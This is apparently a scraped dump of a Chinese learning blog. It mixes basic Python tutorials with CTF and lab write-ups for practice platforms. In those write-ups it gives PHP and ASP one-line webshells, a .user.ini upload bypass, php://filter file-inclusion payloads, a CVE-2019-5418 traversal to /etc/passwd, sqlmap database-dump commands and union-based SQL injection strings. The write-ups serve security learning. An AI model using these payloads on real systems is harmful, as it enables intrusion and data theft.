在列表末尾至少添加一个元素 insert() 在列表任意位置添加一个位置 切片 在任意位置至少添加一个元素 eg: 12345678910111213list=[10,20,30]list.append(100)print(list) #[10,20,30,100]list2=['hello','world']list.append(list2)print(list) # [10, 20, 30, 100, ['hello', 'world']]list.extend(list2)print(list) # [10, 20, 30, 100, ['hello', 'world'], 'hello', 'world'] list.insert(1,90)print(list) # [10, 90, 20, 30, 100, ['hello', 'world'], 'hello', 'world']list3=[True,False,'hello']list[1:]=list3print(list) # [10, True, False, 'hello'] 列表删除 remove() 一次删一个；重复元素只删第一个；元素不存在返回error pop() 删除一个指定索引位置上的元素；指定索引不存在返回error;不指定索引，删除列表中最后一个元素 切片 一次至少删除一个元素 clear() 清空列表 del 删除列表 eg: 12345678910111213141516171819list=[10,20,30,40,50,60,30]list.remove(30)print(list) # [10, 20, 40, 50, 60, 30]list.pop()print(list) # [10, 20, 40, 50, 60]list.pop(1)print(list) # [10, 40, 50, 60]new_list=list[1:3]print(list) # [10, 40, 50, 60]print(new_list) # [40, 50] #不产生新的列表，直接删除原列表内容list[1:3]=[]print(list) # [10, 60]list.clear()print(list) # [] #del 删除列表del listprint(list)print(list) # &lt;class 'list'&gt; 列表修改 为指定索引的元素赋予一个新值 为指定的切片赋予一个新值 eg: 12345list=[10,20,30,40]list[2]=100print(list) # [10, 20, 100, 40]list[1:3]=[300,400,500]print(list) # [10, 300, 400, 500, 40] 列表排序 调用sort(),列中所有元素默认按照从小到大顺序进行排序，可以指定reverse=True进行降序。 调用内置函数sorted(),可以指定reverse=True进行降序排序，原列表不发生变化（产生新列表） eg: 12345678list=[20,40,10,98,45]list.sort()print(list) # [10, 20, 40, 45, 98] #降序list.sort(reverse=True)print(list) # [98, 45, 40, 20, 10]list.sort(reverse=False)print(list) # [10, 20, 40, 45, 98] eg: 1234567list=[20,40,10,98,45]new_list=sorted(list)print(list) # [20, 40, 10, 98, 45]print(new_list) # [10, 20, 40, 45, 98] #降序desc_list=sorted(list,reverse=True)print(desc_list) # [98, 45, 40, 20, 10] 列表生成式[列表元素的表达式 for i in range(1,10)] eg： 1234l=[i for i in range(1,10)]print(l) # [1, 2, 3, 4, 5, 6, 7, 8, 9]l2=[ i*2 for i in range(1,6)]print(l2) # [2, 4, 6, 8, 10]","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://sinky.top/tags/python/"}]},{"title":"攻防世界web-easyupload","slug":"攻防世界web-easyupload","date":"2022-08-17T06:58:13.030Z","updated":"2022-08-17T15:07:24.305Z","comments":true,"path":"2022/08/17/攻防世界web-easyupload/","link":"","permalink":"https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/","excerpt":"","text":"题目描述:一名合格的黑客眼中，所有的上传点都是开发者留下的后门 上传文件后返回文件路径了。 尝试修改后缀为.php，上传失败。 新建一个txt文件，内容为： 12GIF89aabc.jpg 然后文件名改成a.jpg 上传成功。 （注：我以为是带着jpg的头文件就可以用一句话木马了，结果蚁剑连着的时候数据为空，是我天真了，果断看官方wp） 解题思路利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的，主要考察利用fastcgi的.user.ini特性进行任意命令执行 有关利用.usr.ini构建php后门，博文贴： https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 绕过的点： 检查文件是否有php字符串 可以利用段标签绕过，例如&lt;?=phpinfo();?&gt; 检查后缀中是否有htaccess或ph 可以通过上传.user.ini以及正常jpg文件来进行getshell，在服务器中只要运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini,并作为cgi的启动项。 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto+prepend_file 检查文件头部信息 绕过方式即在文件头部添加一个图片的文件头，比如GIF89a 文件MIME类型 绕过方法即修改上传时的Content-Type 新建文件更名为.user.ini，内容为 12GIF89aauto_prepend_file=a.jpg 上传.user.ini，bp抓包，更改Content-Type为image/jpg,放包，显示上传成功。 新建文件更名为a.jpg，内容为 12GIF89a&lt;?=system('cat /flag);?&gt; 上传成功，蚁剑连接，找到flag: 不知道为什么，官方给的payload上传之后500报错，换了一个payload成功了： 12GIF89a&lt;?=eval($_REQUEST['cmd']);?&gt; cyberpeace{6ed12a66909f053b9bc1799622c9ce7e}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"攻防世界web-fileinclude","slug":"攻防世界web-fileinclude","date":"2022-08-17T03:31:33.308Z","updated":"2022-08-17T04:41:04.152Z","comments":true,"path":"2022/08/17/攻防世界web-fileinclude/","link":"","permalink":"https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/","excerpt":"","text":"题目 题目告知flag在flag.php里，分析源代码： 123456789101112131415161718&lt;?phpif( !ini_get('display_errors') ) { ini_set('display_errors', 'On'); # 打开报错提示 }error_reporting(E_ALL); #设置php的报错级别为所有的错误和警告，并返回当前级别$lan = $_COOKIE['language']; #语言切换if(!$lan){ @setcookie(\"language\",\"english\"); # setcookie向客户端发送跟一个Http cookie(由服务器发送到浏览器的变量) @include(\"english.php\"); # 导入语言包}else{ @include($lan.\".php\");# 后缀.php}$x=file_get_contents('index.php'); # index.php 读取到$x中echo $x; #输入x?&gt; 设置cookie-language，就可以执行include($lan.\".php\") 用伪协议php://filter读取文件，格式为：php://filter / [read|write =] 过滤器 / resource= 目标文件 过滤器的分类（及常见过滤器）php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用， string filter(字符过滤器) string.rot13 (对字符串执行 ROT13 转换) 例：php://filter/string.rot13/resource=flag.php string.toupper (转大写) 例：php://filter/string.toupper/resource=flag.php string.tolower (转小写) string.strip_tags (去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果) 例：php://filter/string.strip_tags/resource=flag.php conversion filter (转换过滤器) convert.base64-encode &amp; convert.base64-decode (base64加密 base64解密) 例：php://filter/convert.base64-encode/resource=flag.php convert.quoted-printable-encode &amp; convert.quoted-printable-decode(在字符串后加=0A,及恢复) compression filter(压缩过滤) zlib.deflate &amp; zlib.inflate(压缩 解压) 例：php://filter/zlib.deflate/resource=flag.php 例：php://filter/zlib.inflate/resource=flag.php bzip2.compress &amp; bzip2.decompress(zip 压缩 解压) encryption filter(加密过滤器) resource=&lt;要过滤的数据流&gt; ： 必须参数，指定了要筛选过滤的数据流 read=&lt;独链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔 write=&lt;写链的筛选列表&gt; ： 可选参数，设定一个或多个过滤器名称，以管道符(/)分隔 &lt;;两个链的筛选列表&gt; ： 任何没有以read=或write=做前缀的筛选器列表会视情况应用于读或写链 payload： `cookie：language=php://filter/convert.base64-encode/resource=flag bp抓包，把cookie改成payload,即可得到密文，base64解密即可，或者直接在网页端把cookie改了也行 flag: cyberpeace{771e511122aa7492d439ae469279c22e}","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"攻防世界web-very_easy_sql","slug":"攻防世界web-very_easy_sql未完成","date":"2022-08-17T03:00:36.731Z","updated":"2022-08-17T04:41:04.149Z","comments":true,"path":"2022/08/17/攻防世界web-very_easy_sql未完成/","link":"","permalink":"https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-very_easy_sql%E6%9C%AA%E5%AE%8C%E6%88%90/","excerpt":"","text":"题目描述:太简单了不描述了，给sql签个到吧 题目上说：非内部用户无法访问。 查看源代码，发现有个use.php文件： 不行，看大佬写的wp好难，看不懂，先放一放。 https://blog.csdn.net/m0_48780534/article/details/126309908","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"name":"sql","slug":"sql","permalink":"https://sinky.top/tags/sql/"},{"name":"SSRF","slug":"SSRF","permalink":"https://sinky.top/tags/SSRF/"}]},{"title":"php伪协议","slug":"php伪协议","date":"2022-08-16T08:10:38.035Z","updated":"2022-08-16T08:46:11.888Z","comments":true,"path":"2022/08/16/php伪协议/","link":"","permalink":"https://sinky.top/2022/08/16/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"os: 整合了一下各路大佬的笔记，省得搜来搜去…… 在CTF中可能遇到的文件包含函数： include、require、include_once、require_once、highlight_file、show_source、readfile、file_get_contents、fopen、file php支持的伪协议php伪协议事实上就是支持的协议与封装协议（12种） file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 file://作用用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。 include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 说明file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。 php://作用php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 说明PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 php://input ——可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。 php://output ——只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd ——(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory 与 php://temp ——(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter ——(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 太多了懒得敲了 贴 https://segmentfault.com/a/1190000018991087","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://sinky.top/tags/php/"}]},{"title":"CTF-fileclude","slug":"攻防世界web-fileclude","date":"2022-08-16T07:41:34.049Z","updated":"2022-08-16T08:46:11.884Z","comments":true,"path":"2022/08/16/攻防世界web-fileclude/","link":"","permalink":"https://sinky.top/2022/08/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileclude/","excerpt":"","text":"题目fileclude 描述：好多file呀！ 还没学php，简单分析一下代码： 1234567891011121314151617WRONG WAY! &lt;?phpinclude(\"flag.php\"); # 引入flag.php文件highlight_file(__FILE__); # 对文件进行语法高亮显示if(isset($_GET[\"file1\"]) &amp;&amp; isset($_GET[\"file2\"])) # isset()函数：检测变量是否设置；$_GET[]通过get方法传过来的值{ $file1 = $_GET[\"file1\"]; $file2 = $_GET[\"file2\"]; if(!empty($file1) &amp;&amp; !empty($file2)) # empty()用于检查一个变量是否为空，此处即file1与file2不为空 { if(file_get_contents($file2) === \"hello ctf\") # file_get_contents()把整个文件读入一个字符串中，此处即将hello ctf读取到fikle2中 { include($file1); # 包含$file1 } } else die(\"NONONO\");} （看来想学渗透的话，php学习要提上日程了[汗颜]） $file2内容为hello ctf就可以包含$file1，从题目中可看出flag在flag.php中，此题考察file_get_contents和php伪协议的应用 （有关php伪协议单独写了一篇文，标签为php） f12打开 Max HackBar插件 使用伪协议来构造，得到payload为php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input，post data为hello ctf （不会，搜的大佬wp） base64解码就得到flag: cyberpeace{a0dfa411a1fd4d2c2153ad62391732cf} 关于payload如何构造的，我又去查了一下php伪协议，搜到了一个例子： 例如在 allow_url_include = on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。 ?file=php://filter/read=convert.base64-encode/resource=index.php 解释：php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。如果不进行 base64 编码传入，index.php 就会直接执行，就看不到文件中的内容了。（博文已贴） https://www.cnblogs.com/pursue-security/p/15374168.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://sinky.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"Ruby On Rails漏洞复现第二题（CVE-2019-5418）","slug":"靶场：Ruby On Rails漏洞复现第二题（CVE-2019-5418）","date":"2022-08-16T03:07:09.028Z","updated":"2022-08-16T03:58:12.828Z","comments":true,"path":"2022/08/16/靶场：Ruby On Rails漏洞复现第二题（CVE-2019-5418）/","link":"","permalink":"https://sinky.top/2022/08/16/%E9%9D%B6%E5%9C%BA%EF%BC%9ARuby%20On%20Rails%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%AC%E4%BA%8C%E9%A2%98%EF%BC%88CVE-2019-5418%EF%BC%89/","excerpt":"","text":"背景介绍Ruby On Rails是一个著名的Ruby Web开发框架，它在开发环境中使用Sprockets作为静态文件服务器。Sprockets是一个Ruby库，用于编译和分发静态资源文件。 实训目标1、学会根据漏洞编号查找漏洞详情； 2、了解Ruby On Rails（CVE-2019-5418）形成原理； 3、学习Ruby On Rails（CVE-2019-5418）利用方法； 解题方向利用已知漏洞读取文件passwd; 题目 先百度查一下CVE-2019-5418漏洞详情： 漏洞描述：由于Rubt on Rails使用了指定参数的render file来渲染应用之外的视图，可以通过修改访问某控制器的请求包，通过“../../../../”来达到路径穿越的目的，然后再通过\\{\\{(此处是两个左大括号，因为语法问题只能这么写了，下同此原因)来进行模板查询路径的闭合，使得所要访问的文件被当作外部模板来解析。 影响版本：Rails全版本，其中修复版本：6.0.0.beta3; 5.2.2.1; 5.1.6.2; 5.0.7.2; 4.2.11.1 解题访问IP：端口/robots，bp抓包 robots文件：网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，即robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。 修改数据包Accept内容为 ../../../../../etc/passwd\\{\\{,通过路径穿越实现了任意文件读取 key: mozhe0b757871236a2e73bad56ff2eb6 漏洞修复1、升级 2、禁止接受accept任意的type","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"墨者学院","slug":"墨者学院","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"任意文件读取","slug":"任意文件读取","permalink":"https://sinky.top/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"靶场：内部文件上传系统漏洞分析溯源","slug":"靶场：内部文件上传系统漏洞分析溯源","date":"2022-08-14T03:21:54.947Z","updated":"2022-08-14T08:31:03.086Z","comments":true,"path":"2022/08/14/靶场：内部文件上传系统漏洞分析溯源/","link":"","permalink":"https://sinky.top/2022/08/14/%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/","excerpt":"","text":"文件上传漏洞文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可以通过web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。 当系统存在文件上传漏洞时，攻击者可以将病毒、木马、WebShell以及其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利，根据具体漏洞差异，上传的脚本可以是正常后缀的PHP、ASP以及JSP脚本，也可以是串改后缀后的这几类脚本。 解题 思路 验证上传点是否可直接上传一句话木马 验证是否存在前端验证 验证是否开启mime绕过 验证是否开启文件否检测 验证是否存在文件解析漏洞验证 一句话木马 上传失败 php或asp文件无法上传，但txt、jpg等可以上传 通过F12查看服务，为IIS/6.0 IIS6.0漏洞该版本默认将.asp;.jpg此种格式的文件名，当成asp解析，服务器默认不解析;号极其后面的内容，相当于截断。 例如：上传一个图片文件，名字为“xiao.asp;.jpg”的木马文件，该文件可以被当作asp文件解析并执行。 IIS除了会将asp解析成脚本执行文件之外，还会将cer sdx asa 扩展名解析成asp。 构造一句话木马当我们上传xxx.asp文件时，该文件以后的子文件都以asp文件来执行。 &lt;% eval request(\"a\") %&gt; 上传一句话木马的hack.txt文件，并用bp抓包： 改成hack.asp，这样服务器读到hack.asp目录时后面都以asp文件执行。 最后打开蚁剑，连接其返回地址，找到key即可。 KEY:mozhe7f5448dfef4b57464d1c37c75bf 后记（2022.8.14）做题时看大佬的writeup解的，完全不会，一知半解，做完了感觉会了一点，最起码了解了IIS6.0漏洞和文件上传漏洞的测验方式。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"墨者学院","slug":"墨者学院","permalink":"https://sinky.top/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"WebShell","slug":"WebShell","permalink":"https://sinky.top/tags/WebShell/"}]},{"title":"pikachu-SQL注入","slug":"pikachu-SQL注入","date":"2022-08-14T02:39:51.516Z","updated":"2022-08-14T02:42:04.768Z","comments":true,"path":"2022/08/14/pikachu-SQL注入/","link":"","permalink":"https://sinky.top/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"概述数据库注入漏洞 SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略： 1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入 2、使用参数化（Parameterized Query 或 Parameterized Statement） 数字型注入 随便提交，抓包可知，是post方式提交的参数为 id=2&amp;submit=%E6%9F%A5%E8%AF%A2 使用sqlmap跑post方式时的格式为： python2 sqlmap.py ‐u \"&lt;url&gt;\" ‐‐data=\"&lt;post提交的参数&gt;\" ‐&lt;参数&gt; 1、使用sqlmap跑数据库 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" ‐‐data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch 注释： ‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库 ‐‐dbs 当用户有权读取时，列出所有的数据库 ‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去 2、查数据库pikachu下的表 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" ‐‐data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch 注释： ‐D pikachu 指定数据库pikachu ‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表 3、获取表users中的列 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" ‐‐data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch 注释： ‐T users 指定表明users ‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。 4、获取列username和password中的字段内容 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_id.php\" ‐‐data=\"id=2&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch 注释： ‐C username,password 指定读取列username和password中的字段内容 ‐‐dump 抛出前面指定内容 手工注入1、提交，抓包 2、提交恒等语句可以查询到所有的数据信息 字符型注入 GET方法取表，抓包： 参数返回： GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1 使用sqlmap跑： 1、查数据库 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐‐dbms mysql ‐‐dbs 2、查表 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐‐dbms mysql ‐‐dbs ‐‐batch 3、查列 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch 4、查字段 python2 sqlmap.py ‐u \"http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2\" ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch 搜索型注入为方便用户，提供搜索功能，但是因为没对变量过滤，导致漏洞，分为post get，get型一般用在网站上的搜索，post用于用户名登录，搜索型注入又称文本框注入 原理$sql=\"select * from user where password like '%$pwd%' order by password\"; %匹配任何字符，这句sql语句就是基于用户输入的pws在users表中找到相应的password。 如果用户端输入: and 1=1 and '%'=则会变成： $sql=\"select * from user where password like '%fendo'and 1=1 and '%'='%' order by password\"; 存在sql注入。题 输入一个单引号’ 报错，因为单引号导致语句%’没闭合。 输入 'and 1=1 and '%'=' ,此时语句变为： '%' and 1=1 and '%'='%' order by password 还可以： %’ and 1=1‐‐’ ‘ and 1=1# %’ and 1=1 and ‘%’=’ 可输入 ' and 1=1 order by x# 通过order by x 确定字段数，输入' and 1=1 order by 3#返回正常页面 输入order by 4#返回报错，说明字段数为3. 输入 %' and 1=2 union select 1,2,3# （1）1，2，3都可以回显，输入 %’ and 1=2 union select 1,2,(database())# 可爆出当前使用数据库pikachu （2）输入 %’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=’pikachu’# 得到pikachu数据库下所有表名。 （3）选择users表，输入 %’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=’users’# 得到users表下的所有字段名 （4）输入 %’ and 1=2 union select 1,2,username from pikachu.users# (顶多跟着网上教程做了一遍，挺懵逼的其实。–2020.1.7) xx型注入xx型注入是什么鬼，看到提示笑死 随便输入字符抓个包，是GET型请求，输入特殊字符'\"&lt;&gt;666,回显报错. 尝试闭合一下： #'&gt; &lt;script&gt;alert(\"XSS\")&lt;/script&gt; 哎嗨！成功弹出xss，我真是进步了。 差点忘记这是sql注入了，输入一下万能恒等式： ' and 1=1 '%'=' 回显报错，有戏，但是接下来要怎么构造呢？我先看一下前端代码吧。这是从url那个name去获取到输入的，前端代码没啥用，我去看一下后台吧。 应该是这里了，分析一下，没看懂，注意到那个$query后面的一串字符串，尝试了几个，失败，果断不浪费时间找wp吧。 1、传输方式为get，传输参数为 name=a&amp;submit=%E6%9F%A5%E8%AF%A 2、测试使其闭合的符号：’ ” &lt;&gt;&amp; –+单引号会报错，初步推测使用单引号使其闭合 3、利用联合查询： a') union select 1,2# 爆出数据库名字： a') union select database(),2 # 爆出users： a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' # 查 列： a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # 查字段： a') union select 1,concat(username,password) from pikachu.users # \"insert/update\"注入","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://sinky.top/tags/WEB/"},{"name":"pikachu","slug":"pikachu","permalink":"https://sinky.top/tags/pikachu/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://sinky.top/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Python学习2","slug":"python学习2","date":"2022-08-13T14:45:32.587Z","updated":"2022-08-14T02:53:20.139Z","comments":true,"path":"2022/08/13/python学习2/","link":"","permalink":"https://sinky.top/2022/08/13/python%E5%AD%A6%E4%B9%A02/","excerpt":"","text":"分支结构1、if…else… eg: 12345money=1000s=int(input('请输入取款金额：'))if money &gt;=s: money=money-s print('取款成功，余额为：',money) eg: 从键盘输入一个数判断奇偶。 12345num=int(input(\"请输入一个数字：\"))if num%2==0: print(num,'是偶数')else: print(num,'是奇数') 2、多分支：if…elif…else eg: 录入成绩：90-100为A,80-89为B,70-79为C,60-69为D,50-59为E,输入小于0或大于100为错误输入。 12345678910111213score=int(input('请输入你的成绩：'))if 90&lt;=score&lt;=100: print(\"you are A\")elif 80&lt;=score&lt;90: print('you are B')elif 70&lt;=score&lt;80: print(\"you are C\")elif 60&lt;=score&lt;70: print(\"you are D\")elif 0&lt;=score&lt;60: print('you are E')else: print('Error!!') 3、嵌套if eg: 购物结算时，会员&gt;=200 打八折，&gt;=100打九折，&lt;100不打折；非会员 &gt;=200 打9.5折，&lt;200 不打折 12345678910111213141516answer=input(\"您是否为会员？y or n： \")money=int(input(\"请输入您的金额：\"))if answer=='y': if money&gt;=200: print(\"打八折，您花费了：\",money*0.8) elif money&gt;=100: print(\"打九折，您花费了：\",money*0.9) else: print(\"不打折，您花费了：\",money)elif answer=='n': if money&gt;=200: print(\"打九五折，您花费了：\",money*0.95) else: print(\"不打折，您花费了：\",money)else: print(\"您输入有误！\") 条件表达式： x if 判断条件 else y eg: 比大小 123a=int(input(\"input a num:\"))b=int(input('input a num:'))print( str(a)+'大于等于'+str(b) if a&gt;b else str(a)+'小于等于'+str(b)) pass: 占位符，什么也不做。 内置函数 range() range(stop) —— 创建（0,stop）之间的整数序列，步长为1 range(start,stop) —— （start,stop）之间，步长为1 range(start,stop,step) —— （start,stop）,步长为step eg: 12345678r=range(10)print(r)r=range(1,10)print(list(r)) #[1, 2, 3, 4, 5, 6, 7, 8, 9]print(10 in r) # Falseprint(9 in r) # Trueprint(10 not in r) #Trueprint(9 not in r) #False 循环结构1、while 条件表达式： 循环体 eg: 计算0到4的累加和 1234567a=0sum=0while a&lt;5: sum+=a a+=1print('和为：',sum) # 10 eg:计算1-100之间偶数和 12345678a=1sum=0while a&lt;101: if a%2==0: sum+=a a+=1print(sum) # 2550 2、for-in循环 依次取值，又称遍历 for 变量 in 可迭代对象： 循环体 在循环体中不需要变量时，可写作‘_’ 123456for i in 'python': print(i)for a in range(10): print(a)for _ in range(5): print('人生苦短，我用python') eg:计算1-100之间偶数和 12345sum=0for i in range(1,101): if i%2==0: sum+=iprint(sum) eg: 计算千以内的水仙花数 123456for n in range(100,1000): c=n%10 b=n//10%10 a=n//100 if n==a**3+b**3+c**3: print(n) 3、流程控制语句break 用于结束循环结构 eg:录入密码，最多输入三次，正确则结束退出。 1234567for i in range(3): pwd=input('请输入密码：') if pwd=='8': print('正确') break else: print('错误') 4、continue 结束当前循环，进入下一循环。 eg: 1-50之间5的倍数： 1234for i in range(1,51): if i%5!=0: continue print(i) 5、else 语句 eg: 123456789for i in range(3): pwd=input(\"请输入密码：\") if pwd=='8': print('True') break else: print('False')else: print('Sorry,the three times all False') 6、嵌套循环 eg: 三行四列的矩形 1234for i in range(3): for j in range(1,5): print('*',end='\\t') print() eg: 左侧三角型 1234for i in range(1,10): for j in range(1,i+1): print('*',end='') print() eg: 打印乘法表 1234for i in range(1,10): for j in range(1,i+1): print(i,'*',j,'=',i*j,end=' ') print() 7、二重循环中break和continue eg: 12345for i in range(5): for j in range(1,11): if j%2==0: break print(j) j=1时，break退回外层循环，此后只执行外层循环；改成continue后，内循环将跳回 for j in range(1,11) 